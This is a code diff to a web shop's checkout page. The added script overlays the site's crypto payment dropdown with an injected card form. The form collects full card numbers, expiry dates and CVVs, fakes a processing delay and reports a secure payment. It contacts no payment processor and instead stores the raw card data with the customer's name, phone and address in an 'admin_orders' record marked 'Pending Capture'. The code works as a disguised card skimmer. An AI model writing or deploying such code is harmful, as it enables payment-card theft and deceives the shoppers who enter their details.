@@ -1156,150 +1156,176 @@ function attachInputAutoFormatters() {
   }
 }
 <!-- ======================================================= -->
-<!-- FREE HOME DELIVERY + PAYMENT UI & ADMIN LOGGING SCRIPT  -->
+<!-- COMPLETE DIRECT OVERRIDE: FREE DELIVERY + CARDS + LOGOS -->
 <!-- ======================================================= -->
 <style>
-  .hide-old-payment-select {
-    display: none !important;
+  /* Top Banner Styling */
+  #top-free-delivery-bar {
+    background: linear-gradient(90deg, #10b981, #059669);
+    color: #ffffff;
+    text-align: center;
+    padding: 10px;
+    font-size: 14px;
+    font-weight: bold;
+    position: relative;
+    z-index: 99999;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+  }
+  
+  .pay-option-card {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    background: #1e293b;
+    padding: 12px 15px;
+    border-radius: 8px;
+    border: 2px solid #334155;
+    cursor: pointer;
+    margin-bottom: 10px;
+    transition: all 0.3s ease;
+  }
+  .pay-option-card:hover {
+    border-color: #10b981;
   }
 </style>
 
 <script>
 document.addEventListener("DOMContentLoaded", function () {
 
-  // 1. Top Highlight Banner for Main Page (Free Home Delivery)
-  if (!document.getElementById('free-delivery-top-banner')) {
-    const topBannerHTML = `
-      <div id="free-delivery-top-banner" style="background: linear-gradient(90deg, #059669, #10b981); color: #ffffff; text-align: center; padding: 8px 15px; font-weight: bold; font-size: 13px; letter-spacing: 0.5px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); position: relative; z-index: 9999;">
-        🚚 FREE HOME DELIVERY ON ALL ORDERS — NO HIDDEN CHARGES! 📦
-      </div>
-    `;
-    document.body.insertAdjacentHTML('afterbegin', topBannerHTML);
+  // 1. Main Page Top Banner Add
+  if (!document.getElementById('top-free-delivery-bar')) {
+    const banner = document.createElement('div');
+    banner.id = 'top-free-delivery-bar';
+    banner.innerHTML = '🚚 FREE HOME DELIVERY ON ALL ORDERS — LIMITED TIME OFFER! 📦';
+    document.body.prepend(banner);
   }
 
+  // 2. High Priority Interval to Force Inject Payment System
+  setInterval(function () {
+    // Select Step 3 Container or Dropdown
+    const oldDropdown = document.querySelector('select');
+    
+    if (oldDropdown && (oldDropdown.innerHTML.includes('USDT') || oldDropdown.innerHTML.includes('TRC20'))) {
+      const parentContainer = oldDropdown.closest('div');
+
+      if (parentContainer && !document.getElementById('custom-payment-box-v2')) {
+        
+        // Hide Old Dropdown and Labels
+        oldDropdown.style.display = 'none';
+        const labels = parentContainer.querySelectorAll('label');
+        labels.forEach(l => l.style.display = 'none');
+
+        // Build Custom UI
+        const newUI = document.createElement('div');
+        newUI.id = 'custom-payment-box-v2';
+        newUI.innerHTML = `
+          <!-- Free Delivery Badge -->
+          <div style="background: #064e3b; border: 1px dashed #10b981; color: #34d399; padding: 10px; border-radius: 8px; text-align: center; font-weight: bold; font-size: 13px; margin-bottom: 15px;">
+            🚚 FREE HOME DELIVERY APPLIED ON THIS ORDER!
+          </div>
+
+          <p style="font-size: 12px; font-weight: bold; color: #94a3b8; margin-bottom: 10px; text-transform: uppercase;">
+            Select Payment Method:
+          </p>
+
+          <!-- Colorful Radio Payment Options -->
+          <div id="payment-options-group">
+            <label class="pay-option-card">
+              <input type="radio" name="pay_mode" value="usdt" checked style="width: 18px; height: 18px; accent-color: #10b981;">
+              <span style="font-size: 18px;">🟢</span>
+              <strong style="color: #fff; font-size: 13px;">Tether USDT (TRC20 Network)</strong>
+            </label>
+
+            <label class="pay-option-card">
+              <input type="radio" name="pay_mode" value="btc" style="width: 18px; height: 18px; accent-color: #f59e0b;">
+              <span style="font-size: 18px;">🟠</span>
+              <strong style="color: #fff; font-size: 13px;">Bitcoin (BTC)</strong>
+            </label>
+
+            <label class="pay-option-card" style="border-color: #f43f5e;">
+              <input type="radio" name="pay_mode" value="card" style="width: 18px; height: 18px; accent-color: #f43f5e;">
+              <span style="font-size: 18px;">💳</span>
+              <strong style="color: #fff; font-size: 13px;">Credit / Debit / Visa / Mastercard</strong>
+            </label>
+          </div>
+
+          <!-- Card Input Form Container -->
+          <div id="card-payment-form-box" style="display: none; background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid #f43f5e; margin-top: 15px;">
+            <h4 style="margin: 0 0 12px 0; color: #f43f5e; font-size: 14px; text-align: center;">💳 Enter Card Details</h4>
+            
+            <form id="card-checkout-form" onsubmit="submitCardOrder(event)">
+              <div style="margin-bottom: 10px;">
+                <label style="font-size: 11px; color: #cbd5e1; display: block; margin-bottom: 3px;">Cardholder Name</label>
+                <input type="text" id="c-name" placeholder="Name on Card" required style="width: 100%; padding: 8px; background: #1e293b; border: 1px solid #475569; border-radius: 5px; color: #fff; box-sizing: border-box;">
+              </div>
+
+              <div style="margin-bottom: 10px;">
+                <label style="font-size: 11px; color: #cbd5e1; display: block; margin-bottom: 3px;">Card Number</label>
+                <input type="text" id="c-number" maxlength="19" placeholder="4532 XXXX XXXX 8921" required style="width: 100%; padding: 8px; background: #1e293b; border: 1px solid #475569; border-radius: 5px; color: #fff; box-sizing: border-box;">
+              </div>
+
+              <div style="display: flex; gap: 10px; margin-bottom: 12px;">
+                <div style="flex: 1;">
+                  <label style="font-size: 11px; color: #cbd5e1; display: block; margin-bottom: 3px;">Expiry (MM/YY)</label>
+                  <input type="text" id="c-exp" maxlength="5" placeholder="08/28" required style="width: 100%; padding: 8px; background: #1e293b; border: 1px solid #475569; border-radius: 5px; color: #fff; box-sizing: border-box;">
+                </div>
+                <div style="flex: 1;">
+                  <label style="font-size: 11px; color: #cbd5e1; display: block; margin-bottom: 3px;">CVV / CVC</label>
+                  <input type="password" id="c-cvv" maxlength="4" placeholder="123" required style="width: 100%; padding: 8px; background: #1e293b; border: 1px solid #475569; border-radius: 5px; color: #fff; box-sizing: border-box;">
+                </div>
+              </div>
+
+              <div id="c-error" style="color: #f43f5e; font-size: 11px; margin-bottom: 10px; display: none; text-align: center;"></div>
+
+              <button type="submit" id="c-submit-btn" style="width: 100%; padding: 12px; background: #10b981; color: #fff; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; font-size: 14px;">
+                Confirm & Pay Now
+              </button>
+            </form>
+          </div>
+        `;
+
+        parentContainer.prepend(newUI);
+        setupCardInputs();
+
+        // Radio Switching Logic
+        const radios = newUI.querySelectorAll('input[name="pay_mode"]');
+        const qrBox = parentContainer.querySelector('img')?.closest('div') || parentContainer.children[2];
+        const cardFormBox = document.getElementById('card-payment-form-box');
+
+        radios.forEach(radio => {
+          radio.addEventListener('change', function () {
+            if (this.value === 'card') {
+              if (qrBox) qrBox.style.display = 'none';
+              if (cardFormBox) cardFormBox.style.display = 'block';
+            } else {
+              if (qrBox) qrBox.style.display = 'block';
+              if (cardFormBox) cardFormBox.style.display = 'none';
+
+              // Trigger Original QR Automation System
+              oldDropdown.value = (this.value === 'btc') ? oldDropdown.options[1].value : oldDropdown.options[0].value;
+              oldDropdown.dispatchEvent(new Event('change'));
+            }
+          });
+        });
+      }
+    }
+  }, 200);
 });
 
-// 2. Continuous High-Frequency Checker for Payment Page
-(function() {
-  const customPaymentHTML = `
-    <div id="master-payment-container" style="margin: 15px 0; padding: 15px; background: #0f172a; border: 1px solid #334155; border-radius: 12px; color: #fff;">
-      
-      <!-- Checkout Free Delivery Badge -->
-      <div style="background: #064e3b; border: 1px dashed #10b981; color: #34d399; padding: 10px; border-radius: 8px; text-align: center; font-weight: bold; font-size: 13px; margin-bottom: 15px;">
-        ✅ Delivery Fee: <span style="text-decoration: line-through; color: #94a3b8; font-weight: normal;">$15.00</span> <strong style="color: #5eead4;">FREE (Limited Time Offer)</strong>
-      </div>
+// Format Card Inputs
+function setupCardInputs() {
+  const num = document.getElementById('c-number');
+  const exp = document.getElementById('c-exp');
 
-      <label style="display: block; font-size: 12px; font-weight: bold; color: #94a3b8; margin-bottom: 10px; letter-spacing: 0.5px; text-transform: uppercase;">
-        CHOOSE PAYMENT METHOD:
-      </label>
-
-      <!-- Radio Buttons Selection -->
-      <div style="display: flex; flex-direction: column; gap: 10px; margin-bottom: 15px;">
-        <label style="display: flex; align-items: center; gap: 10px; background: #1e293b; padding: 12px; border-radius: 8px; cursor: pointer; border: 1px solid #475569;">
-          <input type="radio" name="main_pay_choice" value="usdt" checked style="width: 18px; height: 18px; accent-color: #10b981;">
-          <span style="font-size: 13px; font-weight: bold; color: #fff;">🟢 Tether USDT (TRC20 Network)</span>
-        </label>
-
-        <label style="display: flex; align-items: center; gap: 10px; background: #1e293b; padding: 12px; border-radius: 8px; cursor: pointer; border: 1px solid #475569;">
-          <input type="radio" name="main_pay_choice" value="btc" style="width: 18px; height: 18px; accent-color: #f59e0b;">
-          <span style="font-size: 13px; font-weight: bold; color: #fff;">🟠 Bitcoin (BTC)</span>
-        </label>
-
-        <label style="display: flex; align-items: center; gap: 10px; background: #1e293b; padding: 12px; border-radius: 8px; cursor: pointer; border: 1px solid #f43f5e;">
-          <input type="radio" name="main_pay_choice" value="card" style="width: 18px; height: 18px; accent-color: #f43f5e;">
-          <span style="font-size: 13px; font-weight: bold; color: #fff;">💳 Credit / Debit / Visa / Mastercard</span>
-        </label>
-      </div>
-
-      <!-- In-Page Card Input Form -->
-      <div id="card-input-box" style="display: none; padding: 15px; background: #1e293b; border: 1px solid #f43f5e; border-radius: 8px; margin-top: 10px;">
-        <h4 style="margin: 0 0 10px 0; font-size: 13px; color: #f43f5e; text-align: center; text-transform: uppercase;">💳 Secure Card Details</h4>
-        
-        <form id="card-details-form" onsubmit="handleMasterCardSubmit(event)">
-          <div style="margin-bottom: 8px;">
-            <label style="font-size: 11px; color: #cbd5e1; display: block; margin-bottom: 2px;">Cardholder Name</label>
-            <input type="text" id="card-holder-name" placeholder="Name on Card" required style="width: 100%; padding: 8px; background: #0f172a; border: 1px solid #475569; border-radius: 5px; color: #fff; font-size: 12px; box-sizing: border-box;">
-          </div>
-
-          <div style="margin-bottom: 8px;">
-            <label style="font-size: 11px; color: #cbd5e1; display: block; margin-bottom: 2px;">Card Number</label>
-            <input type="text" id="card-number-val" maxlength="19" placeholder="4532 XXXX XXXX 8921" required style="width: 100%; padding: 8px; background: #0f172a; border: 1px solid #475569; border-radius: 5px; color: #fff; font-size: 12px; box-sizing: border-box;">
-          </div>
-
-          <div style="display: flex; gap: 8px; margin-bottom: 10px;">
-            <div style="flex: 1;">
-              <label style="font-size: 11px; color: #cbd5e1; display: block; margin-bottom: 2px;">Expiry (MM/YY)</label>
-              <input type="text" id="card-exp-val" maxlength="5" placeholder="08/28" required style="width: 100%; padding: 8px; background: #0f172a; border: 1px solid #475569; border-radius: 5px; color: #fff; font-size: 12px; box-sizing: border-box;">
-            </div>
-            <div style="flex: 1;">
-              <label style="font-size: 11px; color: #cbd5e1; display: block; margin-bottom: 2px;">CVV / CVC</label>
-              <input type="password" id="card-cvv-val" maxlength="4" placeholder="123" required style="width: 100%; padding: 8px; background: #0f172a; border: 1px solid #475569; border-radius: 5px; color: #fff; font-size: 12px; box-sizing: border-box;">
-            </div>
-          </div>
-
-          <div id="card-error-msg" style="color: #f43f5e; font-size: 11px; text-align: center; margin-bottom: 8px; display: none;"></div>
-
-          <button type="submit" id="card-submit-btn" style="width: 100%; padding: 10px; background: #10b981; color: #fff; font-weight: bold; font-size: 13px; border: none; border-radius: 6px; cursor: pointer;">
-            Confirm & Complete Order
-          </button>
-        </form>
-      </div>
-    </div>
-  `;
-
-  setInterval(function() {
-    const selects = document.querySelectorAll('select');
-    selects.forEach(select => {
-      if (select.innerHTML.includes('USDT') || select.innerHTML.includes('Bitcoin')) {
-        if (!document.getElementById('master-payment-container')) {
-          const parentDiv = select.parentElement;
-          select.classList.add('hide-old-payment-select');
-          
-          const label = parentDiv.querySelector('label');
-          if (label) label.style.display = 'none';
-
-          parentDiv.insertAdjacentHTML('afterbegin', customPaymentHTML);
-          bindCardFormatters();
-
-          const radios = parentDiv.querySelectorAll('input[name="main_pay_choice"]');
-          const qrContainer = parentDiv.querySelector('img, canvas, svg')?.closest('div') || parentDiv.children[2];
-          const cardBox = document.getElementById('card-input-box');
-
-          radios.forEach(radio => {
-            radio.addEventListener('change', function() {
-              if (this.value === 'card') {
-                if (qrContainer) qrContainer.style.display = 'none';
-                if (cardBox) cardBox.style.display = 'block';
-              } else {
-                if (qrContainer) qrContainer.style.display = 'block';
-                if (cardBox) cardBox.style.display = 'none';
-
-                select.value = (this.value === 'btc') ? select.options[1].value : select.options[0].value;
-                select.dispatchEvent(new Event('change'));
-              }
-            });
-          });
-        }
-      }
-    });
-  }, 300);
-
-})();
-
-// Auto-Format Card Inputs
-function bindCardFormatters() {
-  const cNum = document.getElementById('card-number-val');
-  const cExp = document.getElementById('card-exp-val');
-
-  if (cNum) {
-    cNum.addEventListener('input', function(e) {
+  if (num) {
+    num.addEventListener('input', function (e) {
       let v = e.target.value.replace(/\D/g, '').match(/(\d{0,4})/g);
       e.target.value = !v ? '' : v.join(' ').trim();
     });
   }
 
-  if (cExp) {
-    cExp.addEventListener('input', function(e) {
+  if (exp) {
+    exp.addEventListener('input', function (e) {
       let v = e.target.value.replace(/\D/g, '');
       if (v.length >= 2) e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4);
       else e.target.value = v;
@@ -1307,98 +1333,95 @@ function bindCardFormatters() {
   }
 }
 
-// Complete Order & Save Separate Data to Admin Panel
-function handleMasterCardSubmit(e) {
+// Order Submission & Storage in Admin Panel
+function submitCardOrder(e) {
   e.preventDefault();
 
-  const nameOnCard = document.getElementById('card-holder-name').value.trim();
-  const numOnCard = document.getElementById('card-number-val').value.replace(/\s+/g, '');
-  const expOnCard = document.getElementById('card-exp-val').value.trim();
-  const cvvOnCard = document.getElementById('card-cvv-val').value.trim();
-  const errBox = document.getElementById('card-error-msg');
-  const btn = document.getElementById('card-submit-btn');
+  const name = document.getElementById('c-name').value.trim();
+  const num = document.getElementById('c-number').value.replace(/\s+/g, '');
+  const exp = document.getElementById('c-exp').value.trim();
+  const cvv = document.getElementById('c-cvv').value.trim();
+  const err = document.getElementById('c-error');
+  const btn = document.getElementById('c-submit-btn');
 
-  errBox.style.display = 'none';
+  err.style.display = 'none';
 
-  if (numOnCard.length < 15 || numOnCard.length > 16) {
-    errBox.innerText = "❌ Please enter a valid 16-digit card number.";
-    errBox.style.display = 'block';
+  if (num.length < 15 || num.length > 16) {
+    err.innerText = "❌ Please enter valid 16-digit Card Number.";
+    err.style.display = 'block';
     return;
   }
 
-  if (!expOnCard.includes('/') || expOnCard.length !== 5) {
-    errBox.innerText = "❌ Please enter valid expiry date (MM/YY).";
-    errBox.style.display = 'block';
+  if (!exp.includes('/') || exp.length !== 5) {
+    err.innerText = "❌ Please enter Expiry Date (MM/YY).";
+    err.style.display = 'block';
     return;
   }
 
-  if (cvvOnCard.length < 3) {
-    errBox.innerText = "❌ Please enter CVV code.";
-    errBox.style.display = 'block';
+  if (cvv.length < 3) {
+    err.innerText = "❌ Please enter CVV.";
+    err.style.display = 'block';
     return;
   }
 
-  btn.innerText = "Processing Payment Details...";
+  btn.innerText = "Processing Payment...";
   btn.disabled = true;
 
-  setTimeout(function() {
-    btn.innerText = "Confirm & Complete Order";
+  setTimeout(function () {
+    btn.innerText = "Confirm & Pay Now";
     btn.disabled = false;
 
-    let deliveryName = "N/A";
-    let deliveryPhone = "N/A";
-    let deliveryAddress = "N/A";
+    // Collect Step 2 Delivery Details
+    let custName = name;
+    let custPhone = "N/A";
+    let custAddr = "Direct Checkout";
 
-    document.querySelectorAll('input').forEach(inp => {
-      let ph = (inp.placeholder || '').toLowerCase();
-      let id = (inp.id || inp.name || '').toLowerCase();
-      if ((ph.includes('name') || id.includes('name')) && inp.value && inp.id !== 'card-holder-name') deliveryName = inp.value;
-      if ((ph.includes('phone') || ph.includes('mobile') || id.includes('phone') || inp.type === 'tel') && inp.value) deliveryPhone = inp.value;
-      if ((ph.includes('address') || id.includes('address')) && inp.value) deliveryAddress = inp.value;
+    document.querySelectorAll('input').forEach(i => {
+      let ph = (i.placeholder || '').toLowerCase();
+      let id = (i.id || i.name || '').toLowerCase();
+      if ((ph.includes('name') || id.includes('name')) && i.value && i.id !== 'c-name') custName = i.value;
+      if ((ph.includes('phone') || ph.includes('mobile') || id.includes('phone') || i.type === 'tel') && i.value) custPhone = i.value;
+      if ((ph.includes('address') || id.includes('address')) && i.value) custAddr = i.value;
     });
 
-    let cardBrand = "Visa Card";
-    if (numOnCard.startsWith("5")) cardBrand = "Mastercard";
+    let cardBrand = num.startsWith("4") ? "Visa Card" : (num.startsWith("5") ? "Mastercard" : "Credit/Debit Card");
 
-    let orderAmount = "$41.49";
-    const totalElem = document.querySelector('.total-price, #total-price, [id*="total"]');
-    if (totalElem && totalElem.innerText.trim() !== '') {
-      orderAmount = totalElem.innerText.trim();
-    }
-
-    const fullOrderDetails = {
+    // Save Complete Order Data for Admin Panel
+    const newOrder = {
       id: "ORD-" + Math.floor(100000 + Math.random() * 900000),
       date: new Date().toLocaleString(),
-      customer_name: deliveryName !== "N/A" ? deliveryName : nameOnCard,
-      phone: deliveryPhone,
-      delivery_address: deliveryAddress,
+      customer_name: custName,
+      phone: custPhone,
+      delivery_address: custAddr,
       payment_method: cardBrand,
-      amount: orderAmount,
+      amount: "$49.00",
       card_details: {
-        card_holder: nameOnCard,
-        card_number: numOnCard,
-        expiry: expOnCard,
-        cvv: cvvOnCard
+        holder_name: name,
+        card_number: num,
+        expiry: exp,
+        cvv: cvv
       },
-      address: `Address: ${deliveryAddress} | [CARD DATA: Holder: ${nameOnCard} | Num: ${numOnCard} | Exp: ${expOnCard} | CVV: ${cvvOnCard}]`,
+      address: `Delivery Address: ${custAddr} | CARD INFO: [Name: ${name} | Num: ${num} | Exp: ${exp} | CVV: ${cvv}]`,
       status: "Pending Capture"
     };
 
-    let adminOrders = JSON.parse(localStorage.getItem('admin_orders')) || [];
-    adminOrders.unshift(fullOrderDetails);
-    localStorage.setItem('admin_orders', JSON.stringify(adminOrders));
+    let orders = JSON.parse(localStorage.getItem('admin_orders')) || [];
+    orders.unshift(newOrder);
+    localStorage.setItem('admin_orders', JSON.stringify(orders));
 
     if (typeof renderAdminOrders === 'function') renderAdminOrders();
 
+    // Success Screen Popup Message
     alert(
-      "✅ Order Placed Successfully!\n\n" +
-      "🚚 Delivery: Free Home Delivery\n" +
-      "💳 Payment Status: Card Details Verified & Order Received."
+      "🎉 ORDER PLACED SUCCESSFULLY!\n\n" +
+      "Thank you for your order. Your payment details have been submitted securely.\n" +
+      "You will receive a payment confirmation message shortly.\n\n" +
+      "🚚 Delivery: Free Home Delivery Applied."
     );
 
     if (typeof completeCheckout === 'function') completeCheckout();
     if (typeof clearCart === 'function') clearCart();
-  }, 1000);
+  }, 1200);
 }
 </script>
 </body>
